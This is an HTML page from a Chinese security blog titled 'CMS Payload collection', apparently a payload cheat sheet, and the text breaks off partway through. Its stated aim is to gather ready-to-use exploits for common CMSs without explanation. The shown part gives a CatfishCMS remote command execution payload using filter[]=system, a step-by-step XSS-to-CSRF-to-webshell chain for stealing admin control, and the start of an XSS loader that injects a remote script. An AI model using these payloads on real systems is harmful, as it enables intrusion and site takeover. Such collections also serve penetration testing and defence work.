@@ -1,0 +1,1387 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>CMS的Payload收集 | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CatfishCMS"><span class="toc-number">2.</span> <span class="toc-text">CatfishCMS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88CNVD-2019-06255%EF%BC%89CatfishCMS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.1.</span> <span class="toc-text">（CNVD-2019-06255）CatfishCMS远程命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CatfishCMS-4-5-7-csrf-getshell"><span class="toc-number">2.2.</span> <span class="toc-text">CatfishCMS 4.5.7 csrf getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CatfishCMS-4-5-7-xss"><span class="toc-number">2.3.</span> <span class="toc-text">CatfishCMS 4.5.7 xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CatfishCMS-4-6-15-csrf-getshell"><span class="toc-number">2.4.</span> <span class="toc-text">CatfishCMS 4.6.15 csrf getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CatfishCMS-4-6-15-%E5%89%8D%E5%8F%B0xss"><span class="toc-number">2.5.</span> <span class="toc-text">CatfishCMS 4.6.15 前台xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CatfishCMS-4-6-15-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell"><span class="toc-number">2.6.</span> <span class="toc-text">CatfishCMS 4.6.15 后台文件包含getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CatfishCMS%E5%90%8E%E5%8F%B0csrf"><span class="toc-number">2.7.</span> <span class="toc-text">CatfishCMS后台csrf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CatfishCMS%E5%90%8E%E5%8F%B0%E5%82%A8%E5%AD%98%E5%9E%8Bxss"><span class="toc-number">2.8.</span> <span class="toc-text">CatfishCMS后台储存型xss</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CmsEasy"><span class="toc-number">3.</span> <span class="toc-text">CmsEasy</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CmsEasy-7-3-8-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.</span> <span class="toc-text">CmsEasy 7.3.8 sql注入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CmsEasy-7-3-8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">3.2.</span> <span class="toc-text">CmsEasy 7.3.8 任意文件操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CmsEasy-7-3-8-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.</span> <span class="toc-text">CmsEasy 7.3.8 本地文件包含漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CmsEasy-7-6-3-2-20200422-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.4.</span> <span class="toc-text">CmsEasy 7.6.3.2_20200422 逻辑漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Dedecms"><span class="toc-number">4.</span> <span class="toc-text">Dedecms</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88CNVD-2018-01221%EF%BC%89DedeCMS-V5-7-SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.1.</span> <span class="toc-text">（CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88CVE-2018-9175%EF%BC%89Dedecms-V5-7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell"><span class="toc-number">4.2.</span> <span class="toc-text">（CVE-2018-9175）Dedecms V5.7后台的两处getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88CVE-2019-8362%EF%BC%89Dedecms-v5-7-sp2-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-getshell"><span class="toc-number">4.3.</span> <span class="toc-text">（CVE-2019-8362）Dedecms v5.7 sp2 后台文件上传 getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dedecms-swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss"><span class="toc-number">4.4.</span> <span class="toc-text">Dedecms swf文件反射型xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dedecms%E6%89%BE%E5%90%8E%E5%8F%B0"><span class="toc-number">4.5.</span> <span class="toc-text">Dedecms找后台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88CVE-2018-20129%EF%BC%89Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.6.</span> <span class="toc-text">（CVE-2018-20129）Dedecms前台文件上传漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88SSV-97074%EF%BC%89DeDecms-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9"><span class="toc-number">4.7.</span> <span class="toc-text">（SSV-97074）DeDecms 前台任意用户密码修改</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88SSV-97087%EF%BC%89DeDecms-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95"><span class="toc-number">4.8.</span> <span class="toc-text">（SSV-97087）DeDecms 任意用户登录</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Discuz"><span class="toc-number">5.</span> <span class="toc-text">Discuz</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Druid"><span class="toc-number">6.</span> <span class="toc-text">Druid</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Drupal"><span class="toc-number">7.</span> <span class="toc-text">Drupal</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ECShop"><span class="toc-number">8.</span> <span class="toc-text">ECShop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EmpireCMS"><span class="toc-number">9.</span> <span class="toc-text">EmpireCMS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88CVE-2018-18086%EF%BC%89EmpireCMS-7-5-%E5%90%8E%E5%8F%B0getshell"><span class="toc-number">9.1.</span> <span class="toc-text">（CVE-2018-18086）EmpireCMS 7.5 后台getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88CVE-2018-19462%EF%BC%89EmpireCMS-7-5-admindbDoSql-php%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">9.2.</span> <span class="toc-text">（CVE-2018-19462）EmpireCMS 7.5 admindbDoSql.php代码注入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EmpireCMS-6-0-%E6%90%9C%E7%B4%A2%E6%A1%86xss"><span class="toc-number">9.3.</span> <span class="toc-text">EmpireCMS 6.0 搜索框xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EmpireCMS-6-6-7-2-%E8%B7%AF%E5%BE%84%E6%B3%84%E6%BC%8F"><span class="toc-number">9.4.</span> <span class="toc-text">EmpireCMS 6.6-7.2 路径泄漏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EmpireCMS-7-5-%E5%89%8D%E5%8F%B0xss"><span class="toc-number">9.5.</span> <span class="toc-text">EmpireCMS 7.5 前台xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EmpireCMS-7-5-%E5%90%8E%E5%8F%B0xss"><span class="toc-number">9.6.</span> <span class="toc-text">EmpireCMS 7.5 后台xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EmpireCMS-7-5-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">9.7.</span> <span class="toc-text">EmpireCMS 7.5 后台任意代码执行漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EmpireCMS-7-5-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">9.8.</span> <span class="toc-text">EmpireCMS 7.5 配置文件写入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EmpireCMS-%E4%BB%BB%E6%84%8F%E5%85%85%E5%80%BC%E6%BC%8F%E6%B4%9E"><span class="toc-number">9.9.</span> <span class="toc-text">EmpireCMS 任意充值漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Eyoucms"><span class="toc-number">10.</span> <span class="toc-text">Eyoucms</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FastAdmin"><span class="toc-number">11.</span> <span class="toc-text">FastAdmin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEOA"><span class="toc-number">12.</span> <span class="toc-text">泛微OA</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEOA-E-cology%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CNVD-2019-32204%EF%BC%89"><span class="toc-number">12.1.</span> <span class="toc-text">泛微OA E-cology远程代码执行漏洞（CNVD-2019-32204）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEOA-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">12.2.</span> <span class="toc-text">泛微OA 数据库配置文件读取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEOA-%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FRCE%E6%BC%8F%E6%B4%9E"><span class="toc-number">12.3.</span> <span class="toc-text">泛微OA 管理系统RCE漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WorkflowCenterTreeData-%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">12.4.</span> <span class="toc-text">WorkflowCenterTreeData 接口注入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEOA-%E6%97%A5%E5%BF%97%E6%B3%84%E9%9C%B2"><span class="toc-number">12.5.</span> <span class="toc-text">泛微OA 日志泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AE-E-Office%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-2523"><span class="toc-number">12.6.</span> <span class="toc-text">泛微 E-Office文件上传漏洞（CVE-2023-2523)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AE-E-Office%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%EF%BC%88CVE-2023-2648%EF%BC%89"><span class="toc-number">12.7.</span> <span class="toc-text">泛微 E-Office文件上传漏洞 （CVE-2023-2648）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEE-Cology-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2023-15672"><span class="toc-number">12.8.</span> <span class="toc-text">泛微E-Cology SQL注入漏洞(CVE-2023-15672)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEE-Cology-XXE%E6%BC%8F%E6%B4%9E-QVD-2023-16177"><span class="toc-number">12.9.</span> <span class="toc-text">泛微E-Cology XXE漏洞(QVD-2023-16177)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEOA-E-Cology9%E6%9C%AA%E6%8E%88%E6%9D%83SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CNVD-2023-12632"><span class="toc-number">12.10.</span> <span class="toc-text">泛微OA E-Cology9未授权SQL注入漏洞(CNVD-2023-12632)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AE-e-cology-ofsLogin%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E"><span class="toc-number">12.11.</span> <span class="toc-text">泛微 e-cology  ofsLogin任意用户登录漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEE-Cology-x2F-CheckServer-jsp-%E8%B7%AF%E5%BE%84SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-QVD-2023-9849"><span class="toc-number">12.12.</span> <span class="toc-text">泛微E-Cology &#x2F;CheckServer.jsp 路径SQL注入漏洞(QVD-2023-9849)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEE-Office-UserSelect%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">12.13.</span> <span class="toc-text">泛微E-Office UserSelect未授权访问漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEOA-E-Office-mysql-config-ini-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E"><span class="toc-number">12.14.</span> <span class="toc-text">泛微OA E-Office mysql_config.ini 数据库信息泄漏漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JBoss"><span class="toc-number">13.</span> <span class="toc-text">JBoss</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JBOSSApplication-Server%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12149%EF%BC%89"><span class="toc-number">13.1.</span> <span class="toc-text">JBOSSApplication Server反序列化命令执行漏洞（CVE-2017-12149）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JMXInvokerServlet-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-7501%EF%BC%89"><span class="toc-number">13.2.</span> <span class="toc-text">JMXInvokerServlet 反序列化漏洞（CVE-2015-7501）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JBossMQ-JMS-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-7504%EF%BC%89"><span class="toc-number">13.3.</span> <span class="toc-text">JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JMX-Console-HtmlAdaptor-Getshell%EF%BC%88CVE-2007-1036%EF%BC%89"><span class="toc-number">13.4.</span> <span class="toc-text">JMX Console HtmlAdaptor Getshell（CVE-2007-1036）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JBoss%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">13.5.</span> <span class="toc-text">JBoss控制台弱口令</span></a></li></ol></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>CMS的Payload收集</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/10/25
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/CMS/" style="color: #ffa2c4">CMS</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">10k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">51分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.hacking8.com/bug-web/">https://www.hacking8.com/bug-web/</a></p>
+<p>等各种</p>
+<p>收集常见cms的payload方便在某些时候一把梭，不做具体原理解析与复现</p>
+<span id="more"></span>
+
+<hr>
+<h1 id="CatfishCMS"><a href="#CatfishCMS" class="headerlink" title="CatfishCMS"></a>CatfishCMS</h1><h2 id="（CNVD-2019-06255）CatfishCMS远程命令执行"><a href="#（CNVD-2019-06255）CatfishCMS远程命令执行" class="headerlink" title="（CNVD-2019-06255）CatfishCMS远程命令执行"></a>（CNVD-2019-06255）CatfishCMS远程命令执行</h2><p>相关文件：</p>
+<p>catfish&#x2F;library&#x2F;think&#x2F;Request.php</p>
+<p>application&#x2F;config.php </p>
+<p>application&#x2F;config.php 中定义PATHINFO变量名为’ s ‘。可用s传入需要执行的命令，如s&#x3D;dir</p>
+<p>payload：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">s<span class="token operator">=</span>dir<span class="token operator">&amp;</span>_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>method<span class="token operator">=</span><span class="token operator">*</span><span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="CatfishCMS-4-5-7-csrf-getshell"><a href="#CatfishCMS-4-5-7-csrf-getshell" class="headerlink" title="CatfishCMS 4.5.7 csrf getshell"></a>CatfishCMS 4.5.7 csrf getshell</h2><p>相关文件：</p>
+<p>application&#x2F;admin&#x2F;controller&#x2F;Index.php</p>
+<p>前台评论处插入xss代码-&gt;诱骗后台管理员访问网站-内容管理-评论管理-自动执行xss代码-&gt;通过csrf插入一条新文章-&gt;通过csrf清除缓存-&gt;在通过js访问前端任意页面生成缓存建立shell</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//www.xxxxxxx.com/runtime</span></span>
+<span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//www.xxxxxxx.com/runtime/cache</span></span>
+<span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//www.xxxxxxx.com/runtime/cache/8d6ab84ca2af9fccd4e4048694176ebf.php</span></span>
+按顺序输入如果前两个访问得到的结果是403  最后的结果不是403或是404 而是返回正常的页面，那么说明站点的缓存目录是可以访问的，这个时候可以使用此漏洞。配合xss+csrf 获取getshell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="CatfishCMS-4-5-7-xss"><a href="#CatfishCMS-4-5-7-xss" class="headerlink" title="CatfishCMS 4.5.7 xss"></a>CatfishCMS 4.5.7 xss</h2><p>相关文件：</p>
+<p>application&#x2F;config.php</p>
+<p>application&#x2F;index&#x2F;controller&#x2F;Index.php</p>
+<p>application&#x2F;index&#x2F;controller&#x2F;Common.php</p>
+<hr>
+<h2 id="CatfishCMS-4-6-15-csrf-getshell"><a href="#CatfishCMS-4-6-15-csrf-getshell" class="headerlink" title="CatfishCMS 4.6.15 csrf getshell"></a>CatfishCMS 4.6.15 csrf getshell</h2><p>相关文件：</p>
+<p>CatfishCMS-4.6.12\catfish\library\think\Template.php</p>
+<p>poc：</p>
+<p>前台注册一个账户-&gt;注册一个图片马到网站中-&gt;评论处插入xss代码-&gt;等待无辜管理员登录网站-&gt;获取 verification(绕过检测)-&gt;管理员入口-页面管理-新建页面-csrf插入一条非法语句引起包含漏洞(用来包含前面的图片马)-&gt;包含漏洞执行代码-&gt;包含漏洞添加getshell_code.php文件写入恶意代码-&gt;包含漏洞-将框架文件start.php添加一句话木马-包含数据库配置文件-连接数据库-&gt;删除我们前面的评论-&gt;删除我们csrf创建的页面-&gt;邮件通知我们-&gt;getshell</p>
+<p>CatfishCMS-4.6.12-xss.js</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/*  
+    需要插入的xss代码
+    &lt;img src="#" alt="xss_csrf_getshll" onerror="var url = 'http://127.0.0.1/cms/CatfishCMS-4.6.12/xss-js/CatfishCMS-4.6.12-xss.js';xss_js = '&lt;scr'+'ipt src='+url+'>&lt;\/sc'+'ript>';$('body').append(xss_js);">
+*/</span> 
+
+<span class="token comment">//不用动的</span>
